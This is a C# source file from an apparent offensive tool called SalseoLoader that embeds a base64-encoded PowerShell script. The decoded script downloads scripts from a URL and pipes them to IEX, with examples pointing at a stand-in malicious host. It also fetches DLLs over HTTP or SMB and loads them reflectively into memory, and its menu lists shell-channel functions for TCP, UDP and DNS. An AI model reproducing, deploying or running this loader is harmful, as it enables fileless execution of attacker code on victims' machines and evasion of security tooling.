﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SalseoLoader
{
    class Load_Ps1
    {
        public static string loadfileps1()
            {
                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("JG1lbnUgPSBAIgoKICAgX19fIF9fIF9fICBfX19fICBfICAgICAgICAgICAgCiAgLyAgX10gIHwgIHx8ICAgIHx8IHwgICAgICAgICAgIAogLyAgW198ICB8ICB8IHwgIHwgfCB8ICAgICAgICAgICAKfCAgICBfXSAgfCAgfCB8ICB8IHwgfF9fXyAgICAgICAgCnwgICBbX3wgIDogIHwgfCAgfCB8ICAgICB8ICAgICAgIAp8ICAgICB8XCAgIC8gIHwgIHwgfCAgICAgfCAgICAgICAKfF9fX19ffCBcXy8gIHxfX19ffHxfX19fX3wgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogIF9fX19fICBfX19fICBfICAgICBfX19fXyAgX19fXyAKIC8gX19fLyAvICAgIHx8IHwgICAvIF9fXy8gLyAgICB8CiggICBcXyB8ICBvICB8fCB8ICAoICAgXF8gfCAgbyAgfAogXF9fICB8fCAgICAgfHwgfF9fX1xfXyAgfHwgICAgIHwKIC8gIFwgfHwgIF8gIHx8ICAgICAvICBcIHx8ICBfICB8CiBcICAgIHx8ICB8ICB8fCAgICAgXCAgICB8fCAgfCAgfAogIFxfX198fF9ffF9ffHxfX19fX3xcX19ffHxfX3xfX3wKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgIEJ5OiBDeWJlclZhY2EKCiJACiRmdW5jaW9uZXNfcHJldmlhcyA9IChscyBmdW5jdGlvbjopLk5hbWUKW2FycmF5XSRmdW5jaW9uZXNfcHJlY2FyZ2FkYXMgPSAobHMgZnVuY3Rpb246IHwgV2hlcmUtT2JqZWN0IHsoJF8ubmFtZSkuTGVuZ3RoIC1nZSAiNCJ9IHwgc2VsZWN0LW9iamVjdCBuYW1lIHwgZm9ybWF0LXRhYmxlIC1IaWRlVGFibGVIZWFkZXJzIHwgT3V0LVN0cmluZyAtU3RyZWFtICkKZnVuY3Rpb24gTG9hZC1QczEge3BhcmFtKCR0YXJnZXQpCiRoZWxwPUAiCiAgICAKIF8gICAgICAgICAgICAgICAgICAgICBfICAgICAgIF9fX19fXyAgICAgX18gIAp8IHwgICAgICAgICAgICAgICAgICAgfCB8ICAgICAgfCBfX18gXCAgIC8gIHwgCnwgfCAgICAgX19fICAgX18gXyAgX198IHxfX19fX198IHxfLyAvX18gYGB8IHwgCnwgfCAgICAvIF8gXCAvIF9gYCB8LyBfYGAgfF9fX19fX3wgIF9fLyBfX3wgfCB8IAp8IHxfX198IChfKSB8IChffCB8IChffCB8ICAgICAgfCB8ICBcX18gXF98IHxfClxfX19fXy9cX19fLyBcX18sX3xcX18sX3wgICAgICBcX3wgIHxfX18vXF9fXy8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJ5OiBDeWJlcnZhY2EgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAouU1lOT1BTSVMKICAgIFBzMSBsb2FkZXIuCiAgICBQb3dlclNoZWxsIEZ1bmN0aW9uOiBMb2FkLVBzMQogICAgQXV0aG9yOiBMdWlzIFZhY2FzIChDeWJlclZhY2EpCgogICAgRGVwZW5kZW5jaWFzIFJlcXVlcmlkYXM6IE5pbmd1bmEKICAgIERlcGVuZGVuY2lhcyBPcGNpb25hbGVzOiBOaW5ndW5hCi5ERVNDUklQVElPTgogICAgLgouRVhBTVBMRQogICAgSUVYKExvYWQtUHMxIGh0dHA6Ly9lbG1hbC5jb20vZWxtYWwucHMxKQogICAgSUVYKExvYWQtUHMxIFxcMTAuMTAuMTAuMTBccmVjdXJzb1xlbG1hbHBzMSkKICAgIElFWChMb2FkLVBzMSBjOlx0ZW1wXGVsbWFsLnBzMSkKCiAgICBEZXNjcmlwY2lvbgogICAgLS0tLS0tLS0tLS0KICAgIEZ1bmN0aW9uIHRoYXQgbG9hZCBhIGFyYml0cmFyeSBQczEKIkAKCmlmICgkdGFyZ2V0IC1uZSAkbnVsbCAtYW5kICgkdGFyZ2V0LlN1YnN0cmluZygwLDQpKSAtbmUgImh0dHAiKSB7JHRhcmdldCA9ICR0YXJnZXQuVG9Mb3dlcigpfQppZiAoJHRhcmdldCAtZXEgJG51bGwpIHtyZXR1cm4gJGhlbHB9CmlmICgoJHRhcmdldC5TdWJzdHJpbmcoMCw0KSkgLWVxICJodHRwIikgeyAkd2ViID0gTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50IDsgW3N0cmluZ10kc2FsaWRhID0gKCR3ZWIuRG93bmxvYWRTdHJpbmcoJHRhcmdldCkpfQppZiAoJHRhcmdldC5TdWJzdHJpbmcoMSwyKSAtZXEgIjpcIikge2lmICgoVGVzdC1QYXRoICR0YXJnZXQpIC1lcSAkdHJ1ZSkge1tzdHJpbmddJHNhbGlkYSA9IChbU3lzdGVtLmlvLmZpbGVdOjpSZWFkQWxsVGV4dCgkdGFyZ2V0KSl9IGVsc2UgeyJbLV0gRXJyb3IgZW4gbGEgcnV0YSBwcm9waWNvbmFkYSBubyBleGlzdGUgOigifX0KaWYgKCR0YXJnZXQuU3Vic3RyaW5nKDAsMikgLWVxICJcXCIpIHsgW3N0cmluZ10kc2FsaWRhID0gKFtTeXN0ZW0uaW8uZmlsZV06OlJlYWRBbGxUZXh0KCR0YXJnZXQpKX0KaWYgKCRzYWxpZGEgLWVxICAkbnVsbCAtb3IgJHNhbGlkYSAtZXEgIiIpIHsiWy1dIEVycm9yIGVuIGxhIHJ1dGEgcHJvcGljb25hZGEgbm8gZXhpc3RlIDooIn0KcmV0dXJuICRzYWxpZGEKfQpmdW5jdGlvbiBsMDRkM3ItTG9hZERsbCB7CiAgICBwYXJhbShbc3dpdGNoXSRzbWIsIFtzd2l0Y2hdJGxvY2FsLCBbc3dpdGNoXSRodHRwLCBbc3RyaW5nXSRwYXRoKQoKICAgICRoZWxwPUAiCi5TWU5PUFNJUwogICAgZGxsIGxvYWRlci4KICAgIFBvd2VyU2hlbGwgRnVuY3Rpb246IGwwNGQzci1Mb2FkRGxsCiAgICBBdXRob3I6IEjDqWN0b3IgZGUgQXJtYXMgKDN2NFNpME4pCgogICAgRGVwZW5kZW5jaWFzIFJlcXVlcmlkYXM6IE5pbmd1bmEKICAgIERlcGVuZGVuY2lhcyBPcGNpb25hbGVzOiBOaW5ndW5hCi5ERVNDUklQVElPTgogICAgLgouRVhBTVBMRQogICAgbDA0ZDNyLUxvYWREbGwgLXNtYiAtcGF0aCBcXDE5Mi4xNjguMTM5LjEzMlxcc2hhcmVcXG15RGxsLmRsbAogICAgbDA0ZDNyLUxvYWREbGwgLWxvY2FsIC1wYXRoIEM6XFVzZXJzXFBlcGl0b1xEZXNrdG9wXG15RGxsLmRsbAogICAgbDA0ZDNyLUxvYWREbGwgLWh0dHAgLXBhdGggaHR0cDovL2V4YW1wbGUuY29tL215RGxsLmRsbAoKICAgIERlc2NyaXBjaW9uCiAgICAtLS0tLS0tLS0tLQogICAgRnVuY3Rpb24gdGhhdCBsb2FkIGEgYXJiaXRyYXJ5IGRsbAoiQAoKICAgIGlmICgoJHNtYiAtZXEgJGZhbHNlIC1hbmQgJGxvY2FsIC1lcSAkZmFsc2UgLWFuZCAkaHR0cCAtZXEgJGZhbHNlKSAtb3IgKCRwYXRoIC1lcSAiIiAtb3IgJHBhdGggLWVxICRudWxsKSkKICAgIHsKICAgICAgICByZXR1cm4gIiRoZWxwYG4iCiAgICB9CiAgICBlbHNlCiAgICB7CgogICAgICAgIGlmICgkaHR0cCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBSZWFkaW5nIGRsbCBieSBIVFRQIgogICAgICAgICAgICAkd2ViY2xpZW50ID0gW1N5c3RlbS5OZXQuV2ViQ2xpZW50XTo6bmV3KCkKICAgICAgICAgICAgJGRsbCA9ICR3ZWJjbGllbnQuRG93bmxvYWREYXRhKCRwYXRoKQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZigkc21iKXsgV3JpdGUtSG9zdCAiWytdIFJlYWRpbmcgZGxsIGJ5IFNNQiIgfQogICAgICAgICAgICBlbHNlIHsgV3JpdGUtSG9zdCAiWytdIFJlYWRpbmcgZGxsIGxvY2FsbHkiIH0KCiAgICAgICAgICAgICRkbGwgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJHBhdGgpCiAgICAgICAgfQogICAgICAgIAoKICAgICAgICBpZiAoJGRsbCAtbmUgJG51bGwpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1Ib3N0ICJbK10gTG9hZGluZyBkbGwuLi4iCiAgICAgICAgICAgIFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoJGRsbCkKICAgICAgICB9CiAgICB9Cn0KZnVuY3Rpb24gTWVudSB7CgppZiAoW2ludF0kUFNWZXJzaW9uVGFibGUuUFNWZXJzaW9uLk1ham9yIC1nZSA0ICkgewokZnVuY2lvbmVzX2FjdHVhbGVzID0gKGxzIGZ1bmN0aW9uOikuTmFtZQpbYXJyYXldJGZ1bmNpb25lc19wcmVjYXJnYWRhcyA9ICJDbG9zZV9Db25zb2xlIiwiQ2xvc2VfRE5TIiwiQ2xvc2VfVENQIiwiQ2xvc2VfVURQIiwiTWFpbiIsIk1haW5fUG93ZXJzaGVsbCIsIlJlYWREYXRhX0NNRCIsIlJlYWREYXRhX0NvbnNvbGUiLCJSZWFkRGF0YV9ETlMiLCJSZWFkRGF0YV9UQ1AiLCJSZWFkRGF0YV9VRFAiLCJTZXR1cF9DTUQiLCJTZXR1cF9Db25zb2xlIiwiU2V0dXBfRE5TIiwiU2V0dXBfVENQIiwiU2V0dXBfVURQIiwgIlN0cmVhbTFfQ2xvc2UiLCJTdHJlYW0xX1JlYWREYXRhIiwiU3RyZWFtMV9TZXR1cCIsIlN0cmVhbTFfV3JpdGVEYXRhIiwiV3JpdGVEYXRhX0NNRCIsIldyaXRlRGF0YV9Db25zb2xlIiwiV3JpdGVEYXRhX0ROUyIsIldyaXRlRGF0YV9UQ1AiLCJXcml0ZURhdGFfVURQIiwiQ2xvc2VfQ01EIiwibWVudSIsImYiLCJmdW5jIgokZnVuY2lvbmVzX2FjdHVhbGVzID0gJGZ1bmNpb25lc19hY3R1YWxlcyArICRmdW5jaW9uZXNfcHJlY2FyZ2FkYXMKJG51ZXZhc19mdW5jaW9uZXMgPSAoQ29tcGFyZS1PYmplY3QgLVJlZmVyZW5jZU9iamVjdCAkZnVuY2lvbmVzX3ByZXZpYXMgLURpZmZlcmVuY2VPYmplY3QgJGZ1bmNpb25lc19hY3R1YWxlcykuSW5wdXRPYmplY3QKJHNhbGlkYSA9IGZvcmVhY2ggKCRmdW5jaW9uX251ZXZhIGluICRudWV2YXNfZnVuY2lvbmVzKSB7IGlmICgkZnVuY2lvbmVzX3ByZWNhcmdhZGFzIC1ub3Rjb250YWlucyAkZnVuY2lvbl9udWV2YSkgeyJgbiBbK10gJGZ1bmNpb25fbnVldmEifX0KJG1lbnUgPSAkbWVudSArICRzYWxpZGEgKyAiYG4iCnJldHVybiAkbWVudSAKfSBlbHNlIHsKClthcnJheV0kZnVuY2lvbmVzX251ZXZhcyA9IChscyBmdW5jdGlvbjogfCBXaGVyZS1PYmplY3QgeygkXy5uYW1lKS5MZW5ndGggLWdlICI0IiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkNsb3NlXyoiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiUmVhZERhdGFfKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJTZXR1cF8qIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIlN0cmVhbTFfKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJXcml0ZURhdGFfKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJNZW51IiAtYW5kICRfLm5hbWUgLW5lICJmIiAtYW5kICRfLm5hbWUgLW5lICJmdW5jIiAtYW5kICRfLm5hbWUgLW5lICJNYWluIiAtYW5kICRfLm5hbWUgLW5lICJNYWluX1Bvd2Vyc2hlbGwifSB8IHNlbGVjdC1vYmplY3QgbmFtZSB8IGZvcm1hdC10YWJsZSAtSGlkZVRhYmxlSGVhZGVycyB8IE91dC1TdHJpbmcgLVN0cmVhbSApCiRtdWVzdHJhX2Z1bmNpb25lcyA9ICgkZnVuY2lvbmVzX251ZXZhcyB8IHdoZXJlIHskZnVuY2lvbmVzX3ByZWNhcmdhZGFzIC1ub3Rjb250YWlucyAkX30pIHwgZm9yZWFjaCB7ImBuWytdICRfIn0KJG11ZXN0cmFfZnVuY2lvbmVzID0gJG11ZXN0cmFfZnVuY2lvbmVzIC1yZXBsYWNlICIgICIsIiIgCiRtZW51ID0gJG1lbnUgKyAkbXVlc3RyYV9mdW5jaW9uZXMgKyAiYG4iCiRtZW51ID0gJG1lbnUgLXJlcGxhY2UgIiBbK10iLCJbK10iCnJldHVybiAkbWVudQoKfQoKCn0K"));

            }
        
    }
}